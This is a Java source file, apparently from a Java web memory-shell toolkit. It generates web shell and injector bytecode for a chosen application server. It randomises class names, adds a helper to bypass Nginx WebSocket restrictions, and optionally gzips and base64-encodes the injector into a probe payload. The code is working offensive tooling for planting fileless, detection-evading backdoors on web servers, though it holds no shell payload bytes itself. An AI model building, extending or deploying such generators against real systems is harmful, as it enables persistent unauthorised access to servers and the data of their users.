package com.reajason.javaweb.memshell;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.generator.InjectorGenerator;
import com.reajason.javaweb.memshell.generator.WebSocketByPassHelperGenerator;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;
import com.reajason.javaweb.probe.generator.response.ResponseBodyGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class MemShellGenerator {

    public static MemShellResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        String serverName = shellConfig.getServer();
        AbstractServer server = ServerFactory.getServer(serverName);
        if (server == null) {
            throw new GenerationException("Unsupported server: " + serverName);
        }
        Class<?> injectorClass = null;

        if (ShellTool.Custom.equals(shellConfig.getShellTool())) {
            injectorClass = server.getShellInjectorMapping().getInjector(shellConfig.getShellType());
        } else {
            Pair<Class<?>, Class<?>> shellInjectorPair = server.getShellInjectorPair(shellConfig.getShellTool(), shellConfig.getShellType());
            if (shellInjectorPair == null) {
                throw new GenerationException(serverName + " unsupported shell type: " + shellConfig.getShellType() + " for tool: " + shellConfig.getShellTool());
            }
            Class<?> shellClass = shellInjectorPair.getLeft();
            injectorClass = shellInjectorPair.getRight();
            shellToolConfig.setShellClass(shellClass);
        }

        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
            shellToolConfig.setShellClassName(CommonUtil.generateShellClassName(serverName, shellConfig.getShellType()));
        }

        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
        }

        if (shellConfig.isLambdaSuffix()) {
            shellToolConfig.setShellClassName(CommonUtil.appendLambdaSuffix(shellToolConfig.getShellClassName()));
            injectorConfig.setInjectorClassName(CommonUtil.appendLambdaSuffix(injectorConfig.getInjectorClassName()));
        }

        byte[] shellBytes = ShellToolFactory.generateBytes(shellConfig, shellToolConfig);

        injectorConfig.setInjectorClass(injectorClass);
        injectorConfig.setShellClassName(shellToolConfig.getShellClassName());
        injectorConfig.setShellClassBytes(shellBytes);

        if (ShellType.BYPASS_NGINX_WEBSOCKET.equals(shellConfig.getShellType())
                || ShellType.JAKARTA_BYPASS_NGINX_WEBSOCKET.equals(shellConfig.getShellType())) {
            injectorConfig.setHelperClassBytes(WebSocketByPassHelperGenerator.getBytes(shellConfig, shellToolConfig));
        }

        InjectorGenerator injectorGenerator = new InjectorGenerator(shellConfig, injectorConfig);
        byte[] injectorBytes = injectorGenerator.generate();
        if (shellConfig.isProbe() && !shellConfig.getShellType().startsWith(ShellType.AGENT)) {
            ProbeConfig probeConfig = ProbeConfig.builder()
                    .shellClassName(injectorConfig.getInjectorClassName() + "1")
                    .probeMethod(ProbeMethod.ResponseBody)
                    .probeContent(ProbeContent.Bytecode)
                    .targetJreVersion(shellConfig.getTargetJreVersion())
                    .byPassJavaModule(shellConfig.isByPassJavaModule())
                    .shrink(shellConfig.isShrink())
                    .debug(shellConfig.isDebug())
                    .staticInitialize(injectorConfig.isStaticInitialize())
                    .build();
            ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                    .server(serverName)
                    .base64Bytes(Base64.encodeBase64String(CommonUtil.gzipCompress(injectorBytes)))
                    .build();
            injectorBytes = new ResponseBodyGenerator(probeConfig, responseBodyConfig).getBytes();
            injectorConfig.setInjectorClassName(probeConfig.getShellClassName());
        }

        Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();

        return MemShellResult.builder()
                .shellConfig(shellConfig)
                .shellToolConfig(shellToolConfig)
                .injectorConfig(injectorConfig)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellBytes(shellBytes)
                .injectorClassName(injectorConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .injectorInnerClassBytes(innerClassBytes)
                .build();
    }
}